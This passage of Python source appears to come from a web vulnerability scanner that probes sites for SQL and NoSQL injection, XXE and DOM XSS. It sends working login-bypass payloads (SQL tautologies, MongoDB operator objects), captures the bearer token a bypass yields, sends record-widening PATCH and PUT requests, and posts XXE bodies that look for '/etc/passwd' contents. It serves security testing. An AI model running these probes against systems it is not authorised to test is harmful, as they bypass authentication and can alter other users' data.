                vuln_type="generic",
                method=str(param.get("method") or "GET"),
                param_location=str(param.get("location") or "query"),
                evidence="redirect parameter sent the client to an external probe host",
            )
            if item:
                findings.append(item)
    return findings
def _auth_urls_from_body(body: str, page_url: str) -> list[str]:
    origin = _origin(page_url)
    if not origin:
        return []
    out, seen = [], set()
    for raw in _AUTH_PATH_RE.findall(body or ""):
        url = _abs_url(str(raw).split("?")[0], origin)
        if not url or url in seen:
            continue
        seen.add(url)
        out.append(url)
    return out
def _generic_auth_urls(page_url: str) -> list[str]:
    origin = _origin(page_url)
    if not origin:
        return []
    return [urljoin(origin + "/", path.lstrip("/")) for path in _GENERIC_AUTH_PATHS]
def _current_page_params(page_url: str, body: str) -> list[dict]:
    raw = str(page_url or "").split("#")[0]
    if not raw:
        return []
    base = raw.split("?")[0]
    out: list[dict] = []
    seen = set()
    for form_m in _FORM_BLOCK_RE.finditer(body or ""):
        attrs = form_m.group(1) or ""
        inner = form_m.group(2) or ""
        method = "GET"
        mm = _ATTR_METHOD_RE.search(attrs)
        if mm:
            candidate = mm.group(1).upper()
            if candidate in ("GET", "POST", "PUT", "PATCH"):
                method = candidate
        action = base
        am = _ATTR_ACTION_RE.search(attrs)
        if am and str(am.group(1) or "").strip():
            joined = urljoin(base, str(am.group(1)).strip())
            if joined:
                action = joined.split("#")[0]
        loc = "body" if method in ("POST", "PUT", "PATCH") else "query"
        form_names: list[str] = []
        for name in _INPUT_NAME_RE.findall(inner):
            key = str(name or "").strip()
            if not key or key.lower() in seen:
                continue
            seen.add(key.lower())
            form_names.append(key)
        companions = {
            n: ("Submit" if _SUBMIT_KEY_RE.search(n) else "")
            for n in form_names
        }
        for key in form_names:
            out.append({
                "name": key,
                "value": companions.get(key, ""),
                "location": loc,
                "method": method,
                "url": action,
                "source": "form",
                "companions": {k: v for k, v in companions.items() if k != key},
            })
    for name in _INPUT_NAME_RE.findall(body or ""):
        key = str(name or "").strip()
        if not key or key.lower() in seen:
            continue
        seen.add(key.lower())
        out.append({
            "name": key,
            "value": "",
            "location": "query",
            "method": "GET",
            "url": base,
            "source": "form",
        })
    return out
def _script_fetch_rank(url: str) -> int:
    name = (urlparse(url).path or "").rsplit("/", 1)[-1].lower()
    if name.startswith("main") or "main." in name:
        return 0
    if name.startswith("app") or "bundle" in name:
        return 1
    if "chunk" in name or "vendor" in name:
        return 2
    if "polyfill" in name or "runtime" in name or name.startswith("styles"):
        return 8
    return 5


def _harvest_script_text(page_url: str, body: str, limit: int = 6, cookies=None) -> str:
    """Download same-host scripts the page actually references. No path guessing."""
    origin = _origin(page_url)
    chunks = [body or ""]
    seen = set()
    urls = []
    refs = list(_SCRIPT_SRC_RE.findall(body or "")) + list(_MODULEPRELOAD_RE.findall(body or ""))
    for raw in refs:
        url = _abs_url(raw, origin)
        if not url or url in seen:
            continue
        if url.lower().endswith(".map"):
            continue
        seen.add(url)
        urls.append(url)
    urls.sort(key=_script_fetch_rank)
    total = 0
    cap = 4_000_000
    for url in urls[:limit]:
        if total >= cap:
            break
        resp = _send("GET", url, cookies=cookies, timeout=8.0)
        if resp.get("ok") and resp.get("body"):
            piece = str(resp["body"])[: cap - total]
            chunks.append(piece)
            total += len(piece)
    return "\n".join(chunks)
def _extract_bearer(resp: dict) -> str:
    text = str((resp or {}).get("body") or "")
    try:
        data = json.loads(text)
    except Exception:
        return ""
    if not isinstance(data, dict):
        return ""
    blob = data.get("authentication") if isinstance(data.get("authentication"), dict) else data
    if not isinstance(blob, dict):
        blob = data
    for key in ("token", "access_token", "accessToken", "jwt", "id_token"):
        val = blob.get(key)
        if val:
            return str(val)
    return ""


def _login_bearer(url: str, field: str, cookies=None) -> str:
    tautologies = (
        "' OR true--",
        SQL_TAUTOLOGY,
    )
    for taut in tautologies:
        payload = json.dumps({field: taut, "password": "webset"})
        resp = _send("POST", url, payload, "application/json", cookies=cookies)
        token = _extract_bearer(resp)
        if token:
            return token
    for obj in (
        {field: {"$gt": ""}, "password": {"$gt": ""}},
        {field: {"$ne": ""}, "password": {"$ne": ""}},
    ):
        resp = _send("POST", url, json.dumps(obj), "application/json", cookies=cookies)
        token = _extract_bearer(resp)
        if token:
            return token
    return ""


def _probe_json_sqli(url: str, field: str, cookies=None) -> list[dict]:
    findings: list[dict] = []
    resp = {}
    for taut in ("' OR true--", SQL_TAUTOLOGY, "' OR 1=1--"):
        payload = json.dumps({field: taut, "password": "webset"})
        resp = _send("POST", url, payload, "application/json", cookies=cookies)
        if _json_auth_success(resp.get("status") or 0, resp.get("body") or ""):
            break
    else:
        resp = resp or {}
    if _json_auth_success(resp.get("status") or 0, resp.get("body") or ""):
        item = _rule_finding(
            "sqli-auth",
            url=url,
            param=field,
            vuln_type="sqli",
            method="POST",
            param_location="json",
            context="json",
            evidence=(
                f"authentication success after SQL tautology in '{field}' "
                f"(status={resp.get('status')})"
            ),
        )
        if item:
            findings.append(item)
        return findings
    if resp.get("ok"):
        probe_ctx = HttpContext.from_fetch(resp, requested_url=url)
        tagged = [{
            "name": field,
            "value": SQL_TAUTOLOGY,
            "location": "json",
            "method": "POST",
            "url": url,
        }]
        findings.extend(check_sql_error_indicators(probe_ctx, tagged))
        findings.extend(check_verbose_error(probe_ctx, tagged))
    return findings


def _probe_json_nosqli(url: str, field: str, cookies=None) -> list[dict]:
    """Operator-object login probe. Baseline must fail; operator must authenticate."""
    baseline = json.dumps({field: "webset-nosql-baseline", "password": "webset"})
    base_resp = _send("POST", url, baseline, "application/json", cookies=cookies)
    if _json_auth_success(base_resp.get("status") or 0, base_resp.get("body") or ""):
        return []
    operators = (
        {field: {"$gt": ""}, "password": {"$gt": ""}},
        {field: {"$ne": ""}, "password": {"$ne": ""}},
        {field: {"$regex": ".*"}, "password": {"$regex": ".*"}},
    )
    findings: list[dict] = []
    for obj in operators:
        payload = json.dumps(obj)
        resp = _send("POST", url, payload, "application/json", cookies=cookies)
        if not _json_auth_success(resp.get("status") or 0, resp.get("body") or ""):
            continue
        item = _rule_finding(
            "nosqli",
            url=url,
            param=field,
            vuln_type="nosqli",
            method="POST",
            param_location="json",
            context="json",
            evidence=(
                f"authentication success after document operator in '{field}' "
                f"(status={resp.get('status')})"
            ),
        )
        if item:
            findings.append(item)
        break
    if findings:
        return findings
    encoded = (
        urlencode({f"{field}[$gt]": "", "password[$gt]": ""}),
        urlencode({f"{field}[$ne]": "", "password[$ne]": ""}),
        urlencode({f"{field}[$regex]": ".*", "password[$regex]": ".*"}),
    )
    for payload in encoded:
        resp = _send(
            "POST",
            url,
            payload,
            "application/x-www-form-urlencoded",
            cookies=cookies,
        )
        if not _json_auth_success(resp.get("status") or 0, resp.get("body") or ""):
            continue
        item = _rule_finding(
            "nosqli",
            url=url,
            param=field,
            vuln_type="nosqli",
            method="POST",
            param_location="body",
            context="urlencoded-operator",
            evidence=(
                f"authentication success after bracket-operator keys on '{field}' "
                f"(status={resp.get('status')})"
            ),
        )
        if item:
            findings.append(item)
        break
    return findings


_NOSQL_ERROR_HINTS = (
    "mongoerror",
    "mongodb",
    "bson",
    "cast to objectid",
    "cannot apply $",
    "unknown operator",
    "unexpected token $",
    "$where",
    "marsdb",
)
_NOSQL_SURFACES = (
    "/rest/products/reviews",
    "/api/Reviews",
    "/api/reviews",
    "/reviews",
    "/rest/track-order",
    "/api/track-order",
    "/api/orders",
    "/rest/order",
    "/api/order",
    "/api/search",
    "/rest/products/search",
)


def _nosql_error(body: str) -> bool:
    low = (body or "").lower()
    return any(h in low for h in _NOSQL_ERROR_HINTS)


def _json_len(body: str) -> int:
    text = body or ""
    try:
        data = json.loads(text)
    except Exception:
        return len(text)
    if isinstance(data, list):
        return len(data)
    if isinstance(data, dict):
        for key in ("data", "rows", "items", "results", "reviews", "orders"):
            val = data.get(key)
            if isinstance(val, list):
                return len(val)
        return len(data)
    return len(text)


def _probe_nosql_surfaces(page_url: str, cookies=None, bearer: str = "") -> list[dict]:
    origin = _origin(page_url)
    if not origin:
        return []
    findings: list[dict] = []
    auth = {"Authorization": f"Bearer {bearer}"} if bearer else None
    payloads = (
        {"id": {"$ne": -1}, "message": "webset-nosql"},
        {"id": {"$ne": -1}},
        {"_id": {"$ne": ""}},
        {"status": {"$ne": ""}},
        {"message": {"$regex": ".*"}},
    )
    for path in _NOSQL_SURFACES:
        url = urljoin(origin + "/", path.lstrip("/"))
        base = _send("GET", url, cookies=cookies, extra_headers=auth)
        base_body = str(base.get("body") or "")
        base_len = _json_len(base_body)
        for obj in payloads:
            body = json.dumps(obj)
            for method in ("PATCH", "PUT"):
                resp = _send(method, url, body, "application/json", cookies=cookies, extra_headers=auth)
                rbody = str(resp.get("body") or "")
                status = int(resp.get("status") or 0)
                hit = _nosql_error(rbody)
                if not hit and status in (200, 201):
                    if _json_len(rbody) > max(base_len, 1) + 1:
                        hit = True
                    low = rbody.lower()
                    if any(tok in low for tok in ("modified", "nmodified", "updated", "\"status\":\"success\"")):
                        hit = True
                    try:
                        data = json.loads(rbody)
                    except Exception:
                        data = None
                    if isinstance(data, dict):
                        if str(data.get("status") or "").lower() == "success":
                            hit = True
                        for key, val in data.items():
                            if re.search(r"modif|update|matched", str(key), re.I):
                                if isinstance(val, (int, float)) and val >= 1:
                                    hit = True
                if not hit:
                    continue
                item = _rule_finding(
                    "nosqli",
                    url=url,
                    param="id",
                    vuln_type="nosqli",
                    method=method,
                    param_location="json",
                    context="json",
                    evidence=(
                        "document operator in JSON body changed result set "
                        "or produced a document-database error"
                    ),
                )
                if item:
                    findings.append(item)
                return findings
        encoded = urlencode({"id[$ne]": "-1"})
        get_url = url + (("&" if "?" in url else "?") + encoded)
        resp = _send("GET", get_url, cookies=cookies)
        rbody = str(resp.get("body") or "")
        if _nosql_error(rbody) or (
            int(resp.get("status") or 0) == 200
            and _json_len(rbody) > max(base_len, 1) + 1
        ):
            item = _rule_finding(
                "nosqli",
                url=url,
                param="id",
                vuln_type="nosqli",
                method="GET",
                param_location="query",
                evidence="bracket-operator query widened a document lookup",
            )
            if item:
                findings.append(item)
            return findings
        injected = url.rstrip("/") + "/" + json.dumps({"$regex": ".*"})
        resp = _send("GET", injected, cookies=cookies)
        rbody = str(resp.get("body") or "")
        if _nosql_error(rbody) or (
            int(resp.get("status") or 0) == 200
            and _json_len(rbody) > max(base_len, 1) + 1
        ):
            item = _rule_finding(
                "nosqli",
                url=url,
                param="id",
                vuln_type="nosqli",
                method="GET",
                param_location="path",
                evidence="regex operator in path widened a document lookup",
            )
            if item:
                findings.append(item)
            return findings
    return findings
def _xxe_hit(body: str, status: int = 0, url: str = "") -> bool:
    code = int(status or 0)
    if code in (0, 404, 405, 401, 403):
        return False
    text = body or ""
    low = text.lower()
    path = urlparse(str(url or "")).path.lower()
    if any(hit in text for hit in _TRAVERSAL_HITS):
        return True
    if "root:x:" in low or "root:*:" in low or "[boot loader]" in low:
        return True
    if any(tok in low for tok in ("unexpected path", "cannot get", "cannot post")):
        return False
    if code in (200, 410, 500) and any(h in low for h in (
        "external entity", "xmlparse", "xml parser", "invalid xml",
        "error processing", "disallowed doctype",
        "b2b customer complaints", "deprecated for security",
    )):
        return True
    if code in (410, 500) and "upload" in path and any(
        tok in low for tok in ("xml", "pdf", "parse", "entity", "doctype", "file type", "deprecated")
    ):
        return True
    return False


def _probe_xml_xxe(page_url: str, cookies=None) -> list[dict]:
    origin = _origin(page_url)
    if not origin:
        return []
    findings = []
    seen = set()
    for path in _XXE_PATHS:
        url = urljoin(origin + "/", path.lstrip("/"))
        if url in seen:
            continue
        seen.add(url)
        resp = _send("POST", url, _XXE_BODY, "application/xml", cookies=cookies)
        body = str(resp.get("body") or "")
        if _xxe_hit(body, resp.get("status") or 0, url):
            item = _rule_finding(
                "xxe",
                url=url,
                param="xml",
                vuln_type="xxe",
                method="POST",
                param_location="body",
                evidence="XML entity expansion returned local-file or parser signature",
            )
            if item:
                findings.append(item)
            break
        files = {
            "file": ("probe.xml", _XXE_BODY.encode("utf-8"), "text/xml"),
        }
        upload = _send("POST", url, None, None, cookies=cookies, files=files)
        ubody = str(upload.get("body") or "")
        if _xxe_hit(ubody, upload.get("status") or 0, url):
            item = _rule_finding(
                "xxe",
                url=url,
                param="file",
                vuln_type="xxe",
                method="POST",
                param_location="body",
                evidence="XML upload entity expansion returned local-file or parser signature",
            )
            if item:
                findings.append(item)
            break
    return findings
def _dom_xss_from_script(page_url: str, script: str) -> list[dict]:
    """
    DOM XSS from the script that was actually downloaded.
    A query parameter variable must be passed into an HTML sink
    (innerHTML, document.write, insertAdjacentHTML, or a sanitizer bypass)
    in the same function. No path list and no browser.
    """
    origin = _origin(page_url)
    text = script or ""
    if not origin or not text:
        return []
    assign_re = re.compile(
        r"(?:let|var|const)\s+([A-Za-z_$][\w$]*)\s*=\s*[^;]{0,180}?"
        r"(?:queryParams|searchParams)\.([A-Za-z_$][\w$]*)"
    )
    sink_re = re.compile(
        r"bypassSecurityTrustHtml\s*\(\s*([A-Za-z_$][\w$]*)\s*\)"
        r"|insertAdjacentHTML\s*\([^,]+,\s*([A-Za-z_$][\w$]*)\s*\)"
        r"|document\.write(?:ln)?\s*\(\s*([A-Za-z_$][\w$]*)\s*\)"
        r"|\.innerHTML\s*=\s*([A-Za-z_$][\w$]*)\s*[;,)]"
    )
    route_re = re.compile(
        r"""path\s*:\s*(['"`])([^'"`]+)\1\s*,\s*component\s*:\s*([A-Za-z_$][\w$]*)"""
    )
    hash_mode = bool(re.search(r"useHash\s*:\s*(?:!0|true)|HashLocationStrategy", text))
    routes = route_re.findall(text)
    findings = []
    seen = set()
    for match in assign_re.finditer(text):
        ident, param = match.group(1), match.group(2)
        if not param or param.lower() in ("length", "then", "catch"):
            continue
        window = text[match.end(): match.end() + 800]
        used = ""
        for sink in sink_re.finditer(window):
            name = next((g for g in sink.groups() if g), "")
            if name == ident:
                used = sink.group(0)
                break
        if not used:
            continue
        paths = []
        for _q, raw_path, comp in routes:
            pos = text.rfind("var " + comp + "=", 0, match.start() + 1)
            if pos < 0 or match.start() - pos > 50000:
                continue
            path = "/" + str(raw_path or "").strip("/")
            if not path or path == "/" or "*" in path or ":" in path:
                continue
            paths.append(path)
        if not paths:
            continue
        paths.sort(key=lambda p: (0 if re.search(r"search|find|query|result", p, re.I) else 1, len(p)))
        path = paths[0]
        loc = (origin + "/#" + path) if hash_mode else (origin + path)
        key = (param.lower(), loc)
        if key in seen:
            continue
        seen.add(key)
        item = _rule_finding(
            "xss-reflected",
            url=loc,
            param=param,
            vuln_type="xss",
            method="GET",
            param_location="query",
            context="html_body",
            evidence=(
                f"query parameter {param} is passed to an HTML sink "
                f"({used.split('(')[0]}) in the client script for {path}"
            ),
        )
        if item:
            findings.append(item)
    return findings
def _collect_params(ctx: HttpContext, params=None, forms=None, artefact=None, script_blob: str = "") -> list[dict]:
    collected: list[dict] = []
    if params and not _looks_artefact(params):
        collected.extend(params)
    collected.extend(params_from_url(ctx.raw_url or ctx.url))
    page = artefact if isinstance(artefact, dict) else (
        params if _looks_artefact(params) else None
    )
    if page is None:
        page = {
            "url": ctx.raw_url or ctx.url,
            "body": ctx.body or "",
            "headers": getattr(ctx, "headers", None) or {},
            "ok": True,
        }
    body = page.get("body") or ctx.body or ""
    form_list = list(forms or [])
    try:
        from crawler.forms import extract_forms
        form_list.extend(extract_forms(page, page.get("url") or ctx.url))
    except Exception:
        pass
    collected.extend(params_from_forms(form_list))
    collected.extend(params_from_html_links(body, ctx.url))
    try:
        from crawler.param_discover import discover_request_targets
        for target in discover_request_targets(page, ctx.requested_url or ctx.url):
            for field in target.get("parameters") or []:
                collected.append({
                    "name": field.get("name"),
                    "value": field.get("value") or "",
                    "location": field.get("location") or "query",
                    "method": target.get("method") or "GET",
                    "url": target.get("url") or ctx.url,
                    "source": "url",
                })
    except Exception:
        pass
    collected.extend(_current_page_params(ctx.requested_url or ctx.url, body))
    ordered = _dedupe_params(collected)
    _attach_sibling_fields(ordered)
    ordered.sort(key=_param_priority)
    return ordered
_SCAN_PROGRESS = None


def set_scan_progress(callback) -> None:
    global _SCAN_PROGRESS
    _SCAN_PROGRESS = callback


def _tick_scan_progress(param: dict, index: int, total: int) -> None:
    callback = _SCAN_PROGRESS
    if callback is None:
        return
    url = str((param or {}).get("url") or "")
    name = str((param or {}).get("name") or "").strip()
    label = f"{url} · {name}" if url and name else (url or name)
    try:
        callback(0, 0, label)
    except Exception:
        pass


def run_injection_checks(ctx: HttpContext, params=None, forms=None, artefact=None) -> list[dict]:
    started = time.time()
    if not ctx or not ctx.ok or not ctx.url:
        return []
    if artefact is None and _looks_artefact(params):
        artefact = params
        params = None
    cookies = _cookies_from_ctx(ctx, artefact)
    page_body = ""
    if isinstance(artefact, dict):
        page_body = artefact.get("body") or ""
    page_body = page_body or ctx.body or ""
    findings: list[dict] = []
    def _safe(label, fn):
        try:
            return fn() or []
        except Exception as exc:
            print(f"injection_checks {label}:", exc)
            return []
    script_blob = _harvest_script_text(
        ctx.requested_url or ctx.url, page_body, cookies=cookies
    )
    if not isinstance(script_blob, str) or not script_blob:
        script_blob = page_body
    sinks = {"params": [], "hash_paths": [], "hash_params": []}
    try:
        from crawler.param_discover import discover_script_sinks
        sinks = discover_script_sinks(script_blob, ctx.requested_url or ctx.url) or sinks
    except Exception as exc:
        print("injection_checks script_sinks:", exc)
    collected = _collect_params(
        ctx, params=params, forms=forms, artefact=artefact
    )
    collected.extend(sinks.get("params") or [])
    collected = _dedupe_params(collected)
    _attach_sibling_fields(collected)
    collected.sort(key=_param_priority)
    # Probe clock starts after JS harvest so discovery does not eat the inject budget.
    started = time.time()
    findings.extend(_safe("reflected", lambda: check_reflected_input(ctx, collected)))
    _q = urlparse(str(ctx.raw_url or ctx.url or "")).query.lower()
    if "'" in (ctx.raw_url or ctx.url or "") or "%27" in _q or " or " in _q:
        same = [p for p in collected if _belongs_to_page(p, ctx.requested_url or ctx.url)]
        findings.extend(_safe("sql", lambda: check_sql_error_indicators(ctx, same)))
    findings.extend(_safe("verbose", lambda: check_verbose_error(ctx, collected)))
    seen = {
        (f.get("vuln_type"), f.get("param"), str(f.get("url") or "").split("?")[0], f.get("plugin_id"))
        for f in findings
    }
    def _add(items):
        for item in items or []:
            if not item:
                continue
            key = (
                item.get("vuln_type"),
                item.get("param"),
                str(item.get("url") or "").split("?")[0],
                item.get("plugin_id"),
            )
            if key in seen:
                continue
            seen.add(key)
            findings.append(item)
    origin_key = _origin(ctx.requested_url or ctx.url)
    state = _probe_state()
    dom_tried = state["dom"] if state is not None else set()
    if origin_key and origin_key not in dom_tried:
        if state is not None:
            dom_tried.add(origin_key)
        _add(_safe("dom_xss", lambda: _dom_xss_from_script(
            ctx.requested_url or ctx.url,
            script_blob if isinstance(script_blob, str) else "",
        )))
    probed = 0
    for param in collected:
        if probed >= MAX_PROBES:
            break
        if (time.time() - started) >= _INJECT_BUDGET_SEC:
            break
        if not _param_visible(param, page_body):
            continue
        probed += 1
        _tick_scan_progress(param, probed, min(len(collected), MAX_PROBES))
        _add(_safe("probe", lambda p=param: _probe_param(ctx, p, cookies=cookies, page_body=page_body)))
    origin_key = _origin(ctx.requested_url or ctx.url)
    path = urlparse(str(ctx.requested_url or ctx.url or "")).path.rstrip("/") or "/"
    state = _probe_state()
    wide = state["wide"] if state is not None else {}
    used = wide.get(origin_key, 0) if origin_key else _MAX_WIDE_TRIES
    if origin_key and used < _MAX_WIDE_TRIES and (time.time() - started) < _INJECT_BUDGET_SEC and (
        used < 1 or path == "/" or "upload" in path.lower() or "review" in path.lower()
    ):
        if state is not None:
            wide[origin_key] = used + 1
        for item in run_origin_wide_checks(ctx, artefact) or []:
            _add([item])
    return findings


def run_origin_wide_checks(ctx: HttpContext, artefact=None) -> list[dict]:
    """XXE / JSON auth / NoSQL surfaces — once per scan, after crawl."""
    started = time.time()
    if not ctx or not (getattr(ctx, "url", None) or getattr(ctx, "requested_url", None)):
        return []
    cookies = _cookies_from_ctx(ctx, artefact)
    page_body = ""
    if isinstance(artefact, dict):
        page_body = artefact.get("body") or ""
    page_body = page_body or getattr(ctx, "body", "") or ""
    start = ctx.requested_url or ctx.url
    findings: list[dict] = []

    def _safe(label, fn):
        try:
            return fn() or []
        except Exception as exc:
            print(f"injection_checks {label}:", exc)
            return []

    def _add(items):
        for item in items or []:
            if item:
                findings.append(item)

    script_blob = _safe(
        "scripts",
        lambda: _harvest_script_text(start, page_body, cookies=cookies),
    )
    if not isinstance(script_blob, str):
        script_blob = page_body
    auth_urls = _auth_urls_from_body(script_blob, start)
    auth_urls.extend(_generic_auth_urls(start))
    bearer = ""
    for auth_url in list(dict.fromkeys(u for u in auth_urls if u))[:4]:
        if (time.time() - started) >= _INJECT_BUDGET_SEC:
            break
        for field in ("email", "username"):
            _add(_safe("json_sqli", lambda u=auth_url, f=field: _probe_json_sqli(u, f, cookies=cookies)))
            _add(_safe("json_nosqli", lambda u=auth_url, f=field: _probe_json_nosqli(u, f, cookies=cookies)))
            if not bearer:
                token = _login_bearer(auth_url, field, cookies=cookies)
                if isinstance(token, str) and token:
                    bearer = token
    if (time.time() - started) < _INJECT_BUDGET_SEC:
        _add(_safe("nosql_surfaces", lambda: _probe_nosql_surfaces(start, cookies=cookies, bearer=bearer)))
    if (time.time() - started) < _INJECT_BUDGET_SEC:
        _add(_safe("xxe", lambda: _probe_xml_xxe(start, cookies=cookies)))
    return findings
